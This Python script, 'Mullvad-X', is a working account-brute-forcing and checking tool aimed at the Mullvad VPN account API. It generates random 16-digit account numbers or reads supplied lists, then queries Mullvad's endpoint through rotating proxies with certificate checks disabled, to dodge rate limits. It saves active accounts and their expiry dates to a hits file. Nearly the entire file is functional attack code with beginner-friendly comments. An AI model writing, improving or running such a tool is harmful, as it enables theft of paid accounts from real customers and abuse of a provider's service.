import requests # Request module import
from console.utils import set_title # Importing a module to set console title
import random # Random module import
import string # String module
import threading # Threading module
from colorama import Fore # Colorama module
import os # Importing OS module
from tkinter import filedialog # Tkinter module
from random import choice # Random module import
import ctypes # Ctypes module 
import sys # Importing sys module
import time
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class MullvadX: # Our main class (classes are used to organize your code SpEc)
    def __init__(self): # This is our main function that passes the self object
        # Here we shall define our counter variables
        self.good = 0
        self.bad = 0
        self.custom = 0
        self.errors = 0

    def logger(self, account, capture, status): # This function just logs the hits/customs
        if status == 'Hit': # Checks the status of the account
            with open("hits.txt", "a") as file: # Opens the hits.txt file
                file.write(f'{account} | {capture}\n') # Writes the account and capture
        elif status == 'Custom': # same as above
            with open("custom.txt", "a") as file: # sane thing with custom file
                file.write(f'{account} | {capture}\n') # Just writes the account and capture
        elif status == 'Error':
            with open("errors.txt", 'a') as file: 
                file.write(f'ERROR: {account}')

    def gen(self, amount): # This function generates the account numbers
        for _ in range(amount): # This is just a loop, loops are used for repetitive tasks such as doing the same thing 2-inf times
            num = ''.join(random.choice(string.digits) for _ in range(16)) # This generates a random number, the "join" function legit just joins/appends stuff to a string
        return num # This is a return statement, it returns the generated value back to wherever the function was called
    
    def create(self, amount): # This function generates the account numbers
        for _ in range(amount): # This is just a loop, loops are used for repetitive tasks such as doing the same thing 2-inf times
            num = ''.join(random.choice(string.digits) for _ in range(16)) # This generates a random number, the "join" function legit just joins/appends stuff to a string
            open('created.txt', 'a').write(num+'\n')

    def replace(self, text: str, new: dict) -> str: # This function replaces text (I use this for custom prints)
        for old, new in new.items(): # Basically the old is just the text your replacing etc
            text = text.replace(old, new) # Uses the replace function to just replace the text
        return text # Returns to the caller

    def cls(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN+r'''
                    ___  ___      _ _                _      __   __
                    |  \/  |     | | |              | |     \ \ / /
                    | .  . |_   _| | |_   ____ _  __| |______\ V / 
                    | |\/| | | | | | \ \ / / _` |/ _` |______/   \ 
                    | |  | | |_| | | |\ V / (_| | (_| |     / /^\ \
                    \_|  |_/\__,_|_|_| \_/ \__,_|\__,_|     \/   \/                                                                                           
            ______ ______ ______ ______ ______ ______ ______ ______ ______
            |______|______|______|______|______|______|______|______|______|
        ''') # Prints our fancy title/logoish

    def xprint(self, text: object, end: str = "\n"): # My custom printing function - It's pretty lit
        print(self.replace(f"                    &3>> &f{text}",{
                    "&a": Fore.LIGHTGREEN_EX,
                    "&4": Fore.RED,
                    "&2": Fore.GREEN,
                    "&b": Fore.LIGHTCYAN_EX,
                    "&c": Fore.LIGHTRED_EX,
                    "&6": Fore.LIGHTYELLOW_EX,
                    "&f": Fore.RESET,
                    "&e": Fore.LIGHTYELLOW_EX,
                    "&3": Fore.CYAN,
                    "&1": Fore.BLUE,
                    "&9": Fore.LIGHTBLUE_EX,
                    "&5": Fore.YELLOW,
                    "&d": Fore.LIGHTMAGENTA_EX,
                    "&8": Fore.LIGHTBLACK_EX,
                    "&0": Fore.BLACK,},),end=end,)
        
    def checker(self, account_number,proxy_list): # This is our main checker function
        proxy = choice(proxy_list)
        proxies = { # Defines our proxy settings
        'http': 'http://'+proxy,
        'https': 'http://'+proxy
        }
        set_title(f"Mullvad-X | Good: {self.good}  ~  Custom: {self.custom}  ~  Bad: {self.bad}  ~  Errors: {self.errors}") # Sets console title
        url = f'https://api-www.mullvad.net/www/accounts/{account_number}'.strip('\n').strip(' ') # Our base request url
        try:
            response = requests.get(url, proxies=proxies, timeout=5, verify=False) # Posts the request to their server
            data = response.json() # Get the response from the server
            if 'account' in data: 
                if data['account']['active'] == True: # If account is active
                    exp_date = data['account']['expires'] # Gets the expiry date from the json response
                    self.logger(account_number, f'Active: True | Expires: {exp_date}', 'Hit') # Calls the logger function and sends the account data
                    self.xprint(f'&2[+] HIT | {account_number} | Active: True | Expires: {exp_date}') # Prints the hit
                    self.good += 1 # Counts it as good
                elif data['account']['active'] == False: # If account is not active but is valid
                    self.logger(account_number, f'Expired', 'Custom') # Same as above, but with custom status
                    self.xprint(f'&5[+] CUSTOM | {account_number} | Expired') # Counts it as a custom and prints that
                    self.custom += 1 # Counts it as a custom
            elif 'code' in data: # If account not found
                if data['code'] == 'ACCOUNT_NOT_FOUND':
                    self.xprint(f'&4[-] BAD | {account_number}') # Prints that it is bad
                    self.bad += 1 # Counts it as bad    
                else:
                    self.xprint(f'&4[=] ERROR | {account_number} | Rate Limit Exceeded') # Prints that there was a ratelimit
                    self.errors += 1 # Counts it as an error
        except Exception as e:
            self.logger(e, '', 'Error') # logs errors to file
            self.errors += 1 # Counts it as an error

    def main(self):
        set_title(f"Mullvad-X | https://hellishis.me/ | hellish2pro | spec012") # Sets the title for the console
        ctypes.windll.user32.MessageBoxW(0, 'Welcome to Mullvad-X an extreme Mullvad login checker, with a built in hunter mode for generating account IDs and checking them! This project contains, proxy & auth proxy support, insane threading optimization, and much more!', 'Mullvad-X | hellish2pro | spec012', 0) # This is a fancy text box
        self.cls() # Clears the console and prints our custom fancy logo/title
        self.xprint('1. Checker') # Our checker option
        self.xprint('2. Hunter - Checker + Generator') # Our Hunter option
        self.xprint('3. Generate IDs') # Our generator option
        self.xprint('4. Exit') # Exit option
        selected = input('                    >> ') # Our input/selection
        if selected == '1': # Checks if checker is selected
            accounts_file = filedialog.askopenfilename(title='Select accounts file: ') # Opens account file selection dialog
            proxy_file = filedialog.askopenfilename(title='Select proxy file: ') # Opens proxy file selection dialog
            account_list = open(accounts_file).readlines()
            proxy_list = open(proxy_file).readlines() # Reads proxylist file
            if not proxy_list: # Checks if it's empty/doesn't exist
                self.xprint("Proxy list is empty. Please fill it and try again.") # Prints that
                return # Returns
            if not accounts_file: # Checks if it's empty/doesnt exist
                self.xprint("Account list is empty. Please fill it and try again.")
                return # Returns
            thread_count = input('                    Select number of threads\n                    >> ') # Prompts them to select number of threads
            threads = [] # Defines the thread list
            self.cls() # Clears the console
            for account_number in account_list: # Loops through account list
                t = threading.Thread(target=self.checker, args=(account_number.strip('\n').strip(''), proxy_list)) # Creates the threads/defines them
                t.start() # Starts the thread
                threads.append(t) # Adds the thread to the thread list

                if len(threads) >= int(thread_count): # Checks if the number of threads is greater than the thread limit
                    for t in threads: # loop through the threadlist
                        t.join() # Joins the threads
                    threads.clear() # clears the thread list

            for t in threads: # Loops through the threads
                t.join() # Joins the threads
            threads.clear() # clears the thread list
        elif selected == '2': # Checks if hunter is selected
            proxy_file = filedialog.askopenfilename(title='Select proxy file: ') # Opens proxy file selection dialog
            proxy_list = open(proxy_file).readlines() # Reads proxylist file
            if not proxy_list: # Checks if it's empty/doesn't exist
                self.xprint("Proxy list is empty. Please fill it and try again.") # Prints that
                return # Returns
            amount = input('                    Select number of accounts to generate & check\n                    >> ') # Prompts them to select number of accounts
            thread_count = input('                    Select number of threads\n                    >> ') # Prompts them to select number of threads
            threads = [] # Defines the list
            self.cls() # Clears the console
            for i in range(int(amount)): # loop
                t = threading.Thread(target=self.checker, args=(self.gen(1).strip('\n').strip(''), proxy_list)) # Defines the thread with variables
                t.start() # Starts the thread
                threads.append(t) # Appends the thread to the list

                if len(threads) >= int(thread_count): # Checks if the threads are the same amount as thread limit
                    for t in threads: # Appends the thread to the list
                        t.join() # Joins the threads
                    threads.clear() # Clears the threadlist after completion

            for t in threads: # Loops through threads
                t.join() # Joins the threads
            threads.clear() # Clears the threads
        elif selected == '3':
            option = input('                    How many to generate?\n                    >> ')
            self.create(int(option)) # Calls the creation function
            self.xprint(f'Successfully created {option} Account Numbers and placed them into "created.txt"!')
            time.sleep(5)
            self.main()
        elif selected == '4': # Checks if exists is selected
            sys.exit()

if __name__ == '__main__':
    MullvadX().main() # Runs our main function
